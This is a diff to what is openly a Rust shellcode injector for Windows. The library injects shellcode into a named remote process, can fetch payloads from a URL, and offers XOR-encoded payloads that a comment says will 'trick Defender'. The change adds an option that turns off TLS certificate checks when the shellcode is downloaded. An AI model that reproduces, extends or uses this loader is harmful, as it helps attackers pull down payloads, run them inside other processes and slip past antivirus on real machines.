@@ -7,7 +7,7 @@ use std::ptr;
 // External Dependencies
 // =====================
 use base64::{engine::general_purpose, Engine as _};
-use reqwest::blocking::get;
+use reqwest::blocking::Client;
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::Win32::{
     Foundation::{CloseHandle, GetLastError, BOOL, HANDLE, WAIT_EVENT},
@@ -36,8 +36,8 @@ pub struct Injector {
 ///
 /// The possible types of shellcode loaders. They are:
 ///
-/// * `Url`: Raw Shellcode over HTTP(S)
-/// * `Base64Url`: B64-encoded (n-iterations) over HTTP(S)
+/// * `Url`: Raw Shellcode over HTTP(S), ignore_ssl (bool).
+/// * `Base64Url`: B64-encoded (n-iterations) over HTTP(S), ignore_ssl (bool).
 /// * `Embedded`: You give the loader a raw [Vec<u8>]
 ///    of shellcode to inject
 /// * `Base64Embedded`: Instead of a raw [Vec], you use b64
@@ -45,16 +45,16 @@ pub struct Injector {
 ///    which will be decoded at runtime
 /// *  `XorEmbedded`: Embedded shellcode with a seconde [Vec<u8>] as a decryption key. Not really
 /// secure, but it'll trick Defender.
-/// *  `XorUrl`: Pulls the XORed shellcode from the URL, and uses the provided [Vec<u8>] for decryption.
+/// *  `XorUrl`: Pulls the XORed shellcode from the URL, ignore_ssl (bool), and uses the provided [Vec<u8>] for decryption.
 ///
 ///
 pub enum InjectorType {
-    Url(String),
-    Base64Url((String, usize)),
+    Url(String, bool),
+    Base64Url((String, bool, usize)),
     Embedded(Vec<u8>),
     Base64Embedded((String, usize)),
     XorEmbedded((Vec<u8>, Vec<u8>)),
-    XorUrl((String, Vec<u8>)),
+    XorUrl((String, bool, Vec<u8>)),
 }
 
 ///
@@ -176,13 +176,33 @@ pub unsafe fn remote_inject(sc: Vec<u8>, wait: bool, process_name: &str) -> Resu
     }
 }
 
-pub fn download_shellcode(url: &str) -> Result<Vec<u8>, String> {
-    if let Ok(res) = get(url) {
-        if res.status().is_success() {
-            let sc: Vec<u8> = res.bytes().unwrap().to_vec();
-            return Ok(sc);
+pub fn download_shellcode(url: &str, ignore_ssl: bool) -> Result<Vec<u8>, String> {
+    println!("Requesting URL: {url}");
+
+    // Build the client, optionally disabling SSL/TLS certificate validation
+    let client_builder = Client::builder();
+    let client = (
+        if ignore_ssl {
+            client_builder.danger_accept_invalid_certs(true)
+        } else {
+            client_builder
         }
-        Err("Couldn't download shellcode!".to_string())
+    )
+        .build()
+        .map_err(|e| format!("Failed to build client: {}", e))?;
+
+    // Send the request using the custom client
+    let res = client
+        .get(url)
+        .send()
+        .map_err(|e| format!("Request failed: {}", e))?;
+
+    if res.status().is_success() {
+        let sc: Vec<u8> = res
+            .bytes()
+            .map_err(|e| format!("Failed to read response bytes: {}", e))?
+            .to_vec();
+        Ok(sc)
     } else {
         Err("Couldn't connect!".to_string())
     }
